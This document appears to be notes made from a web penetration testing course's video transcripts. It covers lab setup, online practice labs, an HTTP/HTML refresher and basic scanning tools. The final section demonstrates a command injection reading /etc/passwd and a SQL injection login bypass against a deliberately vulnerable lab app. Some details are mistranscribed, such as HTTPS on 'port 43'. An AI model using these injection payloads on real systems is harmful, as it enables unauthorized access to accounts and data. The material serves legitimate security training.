> **[4:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=248)** And we'll select "Extensions" and we'll browse to jsticket.zip.
>
> **[4:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=263)** And we'll upload and install.
>
> **[4:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=266)** We'll go to Menus, Manage and we'll add a new menu.
>
> **[4:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=272)** And we'll call it "Support Tickets".
>
> **[4:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=278)** Menu type is "Application", and the Description, we'll put as "Support Tickets".
>
> **[4:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=289)** And in Support Tickets, we'll add the three jssupport jobs as menu items.
>
> **[5:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=303)** JS Support Ticket control panel, and we'll call that "Control".
>
> **[5:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=313)** And select JS Support Ticket, "My Tickets", and we'll select "Open Tickets", and save.
>
> **[5:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=336)** And finally, we can publish them.
>
> **[5:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=342)** That's all for now, and we'll come back to Joomla later.

> [!info]- Semantic Content
>
> **CLI Commands:** sudo (4), mysql (2), unzip (2), cd (1), wget (1)
> **Code Keywords:** let (5), var (3), interface (1), finally, (1)
> **Prerequisites:** install (3), set up (3), setup (1)
> **Code Identifiers:** joomla_db (2)
> **URLs:** [https://downloads.joomla.org](https://downloads.joomla.org) (1), [cybex.com](https://cybex.com) (1)
> **Versions:** 5.0 (1), 192.168.1 (1)
> **UI Navigation:** go to (1)
> **Speakers:** - let (1)

#### Online testing sites
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=0)** - [Malcolm] Offensive security provides a set of freely accessible machines in their penetration testing playground, and this is the first of two online testing sites we'll use during the course.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=11)** We'll be using the free play tier, Proving Ground.
>
> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=15)** Once we signed up, we can log into PG Play.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=18)** Here we can see the list of available machines that we can use in the Play Lab.
>
> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=24)** To do testing, we can either use My Kali, which is an online Kali instance or we can download a VPN pack in order to use our own testing environment.
>
> **[0:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=35)** If we hover over a target, we can see more details, and we can start it using the run button at the right.
>
> **[0:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=42)** At the top, we have Lampiao, and if we hover over it we can see that it's an intermediate difficulty target and we'll be looking for Proof Doc text.
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=51)** Before we start it, we'll click on My Kali, and this will open a Kali instance in a new web tab.
>
> **[1:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=60)** This takes a few seconds to load up and then we're ready to go.
>
> **[1:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=64)** We can now start Lampiao.
>
> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=68)** The IP address of Lampiao is now displayed.
>
> **[1:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=72)** In our Kali instance, we can use Firefox and we can go to 192.168.55.48 and we see the website displayed.
>
> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=89)** We'll stop this and leave offensive security for now, but we'll come back to this lab later in the course.
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=95)** Another penetration testing lab we'll be using for our advanced web testing is the hack-the-box lab.
>
> **[1:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=102)** To follow along using the more advanced systems we'll be looking at will require a paid subscription however.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=109)** I've logged into the portal, and we can select labs, machines.
>
> **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=116)** This provides access to a range of active machines and retired machines.
>
> **[2:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=122)** If we check the support target at the top of the list, we get the option to join this live machine.
>
> **[2:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=131)** When we click on that, we see its IP address.
>
> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=135)** To connect to it, we can check connect to HTB, machines, and then either download a VPN pack to use our own testing environment or use the online parrot based test environment.
>
> **[2:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=149)** We'll come back to both of these labs as we proceed through the course.
>
> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=153)** We're now ready to start testing.
>
> **[2:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=155)** If you feel that you're up to speed on web technology and testing, you can skip the refresher section and go straight to the advanced web material.

> [!info]- Semantic Content
>
> **Env Vars:** vpn (2), htb (1)
> **UI Navigation:** click on (2)
> **Code Keywords:** require (1)
> **Versions:** 192.168.55 (1)
> **Cross-References:** later in (1)
> **Tools:** firefox (1)
> **Definitions:** is an  (1)
> **Prerequisites:** before we start (1)


### 2. Refresher

> [[#Table of Contents|↑ Back to Table of Contents]]

#### A refresher on web technology
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=0)** - [Narrator] Websites are the main conduit for computer-based information and browsers are now the preferred interface used to access application systems.
>
> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=10)** There are many forms of websites and to be a web application tester, we need to have a good working knowledge, not only of the underlying protocols used for web access, but also the structure of websites.
>
> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=24)** I introduced the basics of website testing in my ethical hacking course on hacking web servers and web applications.
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=32)** Let's just refresh ourselves on what we learned about how websites are presented.
>
> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=38)** A web application is built using HTML and script code, running on a web server that offers an HTTP or HTTPS protocol access, the more recent WS and WSS web socket protocols or the experimental QUIC protocol.
>
> **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=56)** It will likely use a backend database server or some form of flat file for content.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=63)** A user will connect to the application from a browser which may be running on a desktop, a laptop, or a mobile device.
>
> **[1:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=72)** The web application may want to authenticate the user.
>
> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=76)** And to do that, use some form of backend authentication system such as LDAP.
>
> **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=82)** It's good practice to not expose a web application server directly to the internet and so a web proxy will be placed between the user and the web application.
>
> **[1:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=92)** The proxy server takes user requests and sends them to the web application and takes web application responses and returns them to the user.
>
> **[1:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=102)** A web proxy is designed to be secure and is a much safer internet-facing system than a full web server.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=109)** Early web applications tended to be mainly written on the server side, with forms being used to request data.
>
> **[1:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=117)** Nowadays, much of the code is client-side, often supported with client-side data stores.
>
> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=123)** While content management systems have a standardized web folder structure, the folder structures for custom-built web applications will be application-specific.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=133)** Also, individual web servers have their own default folder structure.
>
> **[2:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=138)** This may be changed for production, but understanding what a default website would look like for each type of server is a good start.
>
> **[2:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=146)** A website exists as folders on a host with the homepage of the website on a typical Linux Apache installation being located at /var/www/html.
>
> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=158)** And on a typical Windows installation of IIS being in /inetpub/wwwroot.
>
> **[2:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=168)** The hypertext markup language, HTML, is the basic building block of a website.
>
> **[2:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=174)** A simple webpage might just start with an HTML tag as shown here.
>
> **[3:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=180)** More usually, a webpage starts with a declaration that the page is indeed HTML written as DOCTYPE html.
>
> **[3:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=188)** After that, the basic component of a webpage is a set of elements in between the start and end markers shown as a name bracketed with less than and greater than symbols.
>
> **[3:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=199)** The start marker may additionally have attributes in between the open and closed brackets.
>
> **[3:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=204)** The element start is sometimes known as a tag and there are a number of standard ones, such as title, the H tag for headers, body, and the P tag for paragraph.
>
> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=216)** Another useful tag is the href tag, which enables a webpage to reference another page through a hyperlink.
>
> **[3:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=224)** Web designers have gone much further with the way in which webpages are crafted in order to ensure a consistent application of styles.
>
> **[3:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=233)** We can use the style element for a page or for the whole website.
>
> **[3:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=238)** This can be included in the page or more usually in its own file external to the HTML file.
>
> **[4:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=245)** The full external styling approach is known as cascading style sheets.
>
> **[4:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=250)** We'll also see tables and forms appearing in many web pages, particularly those that we're interested in as a tester.
>
> **[4:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=258)** We need to understand how the forms pass data to be validated and processed as this can be an area of weakness in some sites.
>
> **[4:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=266)** Forms have their own form tag and are constructed with various elements to enable data input and often have the div elements which define areas of the page.
>
> **[4:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=278)** There are also XML, PHP, and JavaScript tags which allow active code to be included in web pages.
>
> **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=286)** Here's an example of a call to an external JavaScript file and an embedded line of JavaScript code.
>
> **[4:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=294)** One of the important elements of messages exchanged from a PHP-driven website is the PHP session ID.
>
> **[5:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=301)** And this is something we'll use during our testing to enable us to work inside PHP sessions.
>
> **[5:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=308)** We'll be seeing more of active code as we progress through the course.
>
> **[5:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=313)** Finally, in addition to understanding what the target looks like and how it's built from a static perspective, the web application tester also needs to be knowledgeable in the message protocols used by the application when it's operating and particularly the two common protocols, HTTP and HTTPS.
>
> **[5:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=333)** HTTP is a stateless client server protocol which can be used from a browser or programmatically between hosts.
>
> **[5:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=342)** An http:// URL will establish a TCP connection on port 80 as we can see here.
>
> **[5:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=351)** And https:// will establish a connection by default on port 43.
>
> **[5:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=358)** HTTPS will be used to set up a protected data transfer using TLS packets.
>
> **[6:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=364)** It's not unusual to see a web server set up on a different port such as 8080.
>
> **[6:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=370)** An HTTP exchange consists of an HTTP request message, which is sent to the web server, and an HTTP response message, which is returned.
>
> **[6:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=382)** In an interactive session, the HTTP response will provide data for the user which needs to be displayed, i.e., an HTML webpage.
>
> **[6:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=391)** We can see the selected response packets in the bottom panel as a zipped text HTML page.
>
> **[6:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=398)** GET is one of eight standard request commands or methods defined in HTTP.
>
> **[6:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=404)** The GET command allows a user to download a web resource from the server.
>
> **[6:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=409)** This will often be a webpage specified by a file name.
>
> **[6:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=413)** Omitting the file name will cause the default first page to be returned.
>
> **[6:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=418)** The HEAD request is used in the same way as GET, but will download just the header or metadata.
>
> **[7:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=424)** This is commonly done to check the last modified data of the page and check against a local-cached copy.
>
> **[7:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=431)** The POST command allows a user to upload items to the server.
>
> **[7:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=435)** This is commonly used to send form data back to the server and is the key message that's of interest to pen testers.
>
> **[7:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=442)** The TRACE command requests a diagnostic trace of the actions taken by the server.
>
> **[7:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=448)** The OPTIONS command asks the server to return the list of request methods it supports.
>
> **[7:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=454)** The CONNECT command causes the proxy to connect to another host.
>
> **[7:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=458)** This is often used to make an SSL connection through the proxy.
>
> **[7:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=463)** Two important commands when doing web application testing are the PUT command to send data to the server to be stored and the DELETE command to delete data.
>
> **[7:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=473)** These are often not used in production systems for security reasons, but if they do exist, then we can likely take advantage of them.
>
> **[8:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=482)** There are seven common status codes.
>
> **[8:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=485)** 200 indicates that the request was processed without any problems.
>
> **[8:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=490)** 301 means redirection for pages that have been moved.
>
> **[8:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=495)** 400 is a bad request.
>
> **[8:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=497)** 401 is unauthorized.
>
> **[8:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=500)** 403 means access is forbidden.
>
> **[8:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=504)** And the commonly seen 404 means that it's an unknown page.
>
> **[8:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=509)** 500 is an internal server error.
>
> **[8:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=512)** While websites often use just a few header fields, there are many that have been defined in the HTTP standard.
>
> **[8:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=520)** The webpage shown here is an excellent quick reference for all the HTTP header fields that you might come across during testing.

> [!info]- Semantic Content
>
> **Env Vars:** http (10), html (7), php (4), https (3), wss (1)
> **Definitions:** is a  (5), known as (2), is an  (2), means that (1)
> **Code Keywords:** delete (2), interface (1), let (1), var (1), pass (1)
> **API Endpoints:** get  (2), head  (1), post  (1), options  (1), put  (1)
> **CLI Commands:** php (4), apache (1), make (1)
> **Analogies:** such as (3)
> **Ports:** port 80 (1), port 43 (1)
> **Prerequisites:** set up (2)

#### Refreshing your basic web testing skills
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=0)** - [Instructor] In my Hacking Web Servers and Web Applications course.
>
> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=4)** We not only learned about web technology, but also about web testing tools and techniques.
>
> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=10)** We covered the two main ways of testing web applications.
>
> **[0:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=14)** The first is to scan the web pages or application screens, looking for vulnerabilities.
>
> **[0:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=19)** And the second is proxying traffic in order to manipulate the messages being passed to and from the application.
>
> **[0:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=27)** We'll be using both.
>
> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=29)** We also covered ways to hijack sessions with cookies and methods of manipulating URL parameters.
>
> **[0:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=35)** Let's do a quick refresher of some of the tools and techniques we covered in the course.
>
> **[0:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=41)** We can do basic profiling by using a tool called whatweb.
>
> **[0:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=45)** Let's use this to profile mutillidae.
>
> **[0:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=48)** Whatweb http:// 192.168.1.176/ mutillidae.
>
> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=61)** This shows two sets of output, the first being the web server with a redirect and the second, the redirected site.
>
> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=68)** The basic web server details such as the version of Apache are the same, of course.
>
> **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=74)** The nikto tool provides a basic level of vulnerability analysis.
>
> **[1:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=78)** And we can also run this against mutillidae.
>
> **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=82)** Nikto -h [http://192.168.1.176/mutillidae](http://192.168.1.176/mutillidae).
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=95)** Here we get the same basic server information, the Linux and Apache versions, but we also get a long list of possible vulnerabilities with their reference in the open source, vulnerability database.
>
> **[1:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=110)** We might carry out an automated scan of a website using the OWASP ZAP tool.
>
> **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=116)** We can select automated scan and enter the URL, which is 192.168.1.176/mutillidae,
>
> **[2:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=130)** and press attack.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=133)** And we can see the pages being scanned as well as the external pages, which are shown with red markers and are skipped.
>
> **[2:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=141)** If we check the Alerts tab, we can see the potential vulnerabilities, which zap has identified.
>
> **[2:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=150)** Injection of code is a significant attack technique, whether we do it via the URL or in a form.
>
> **[2:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=156)** Let's refresh ourselves on how to do command injection.
>
> **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=160)** Here, we are expected to enter a message to be echoed back.
>
> **[2:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=164)** So we'll enter Hello World.
>
> **[2:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=169)** And what we get is what we expect.
>
> **[2:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=172)** However, we can add an additional command onto the end of the message.
>
> **[2:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=177)** Hello world .cat/etc/passwd.
>
> **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=186)** And here we get not only our message, but also a listing of all accounts on the system.
>
> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=192)** SQL injection is another common injection attack, which we can see in mutillidae.
>
> **[3:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=201)** Here we have a log on page, so let's try to log in as admin.
>
> **[3:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=207)** Admin.
>
> **[3:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=209)** And for the password, we'll enter, "or1=1#.
>
> **[3:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=220)** And log in.
>
> **[3:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=222)** And we're in as admin and we've bypassed the nikto authenticate.
>
> **[3:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=227)** That's been a succinct refresher of our basic knowledge of web testing with a couple of examples.
>
